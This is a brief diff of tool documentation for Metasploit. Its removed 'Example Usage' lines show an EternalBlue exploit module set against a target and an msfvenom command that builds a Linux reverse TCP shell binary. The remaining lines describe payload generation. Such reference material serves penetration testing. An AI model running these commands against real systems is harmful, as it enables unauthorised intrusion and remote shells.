@@ -10,14 +10,8 @@
     * Includes `msfconsole`, `msfvenom`, and extensive module database for red teaming and penetration testing.
 
   Options:
-    msfconsole: Launch the interactive console for module management and sessions.
     msfvenom -p <payload> -f <format>: Generate payload binaries or shellcode.
     msfconsole -r <resource.rc>: Execute scripted workflows via resource files.
-
-  Example Usage:
-    * `msfconsole -q` -- Start the console quietly and search for modules.
-    * `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS <target>` → `run` -- Test SMBv1 vulnerability.
-    * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf` -- Craft a reverse shell payload.
 */
 
 _:
